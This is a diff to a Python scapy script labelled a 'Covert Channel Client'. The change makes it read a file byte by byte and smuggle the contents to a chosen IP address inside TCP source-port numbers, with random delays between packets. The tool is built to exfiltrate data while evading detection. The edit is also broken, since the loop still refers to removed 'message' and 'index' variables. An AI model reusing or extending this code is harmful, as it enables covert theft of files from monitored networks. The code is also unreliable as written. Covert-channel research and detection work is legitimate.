@@ -6,10 +6,15 @@ from random import randint
 import setproctitle
 import argparse
 import time
+import os
 
 global maxPort
+global lastPosition
+global fileSize
 maxPort = 65535
 asciiMax = 127
+lastPosition = 0
+fileSize = 0
 
 # creates a packet where the arguments char1 and char2 are set as the tcp source port
 def createPacketTwo(char1, char2):
@@ -35,20 +40,32 @@ def createPacketOne(char):
   packet = IP(dst=args.destIp)/TCP(dport=80, sport=maxPort -intPortVal)
   return packet
 
+def readOneByte(fileDescriptor):
+  global lastPosition
+  fileDescriptor.seek(lastPosition)
+  byte = fileDescriptor.read(1)
+  lastPosition = fileDescriptor.tell()
+  return byte
+
+
 def sendPackets():
-  index = 0;
-  length = len(message)
-  while index < length:
-    if index == length -1:
-      packet = createPacketOne(message[index])
+  global fileSize
+  global lastPosition
+  fileDescriptor = open(args.path, 'r')
+  while lastPosition < fileSize:
+    if lastPosition == fileSize - 1:
+      char = readOneByte(fileDescriptor)
+      packet = createPacketOne(char)
     else:
+      char1 = readOneByte(fileDescriptor)
+      char2 = readOneByte(fileDescriptor)
       packet = createPacketTwo(message[index], message[index + 1])
+
     send(packet)
     index = index + 2
 
     print "sport: " + str(packet.sport)
     time.sleep(randint(1,int(args.sendInterval)))
-    # packet[0].show()
 
 # start of execution
 parser = argparse.ArgumentParser(description='Covert Channel Client')
@@ -68,5 +85,5 @@ parser.add_argument('-i'
                    , help='Max interval to wait between sends, in seconds.'
                    , required=True)
 args = parser.parse_args()
-
+fileSize = os.path.getsize(args.path)
 sendPackets()
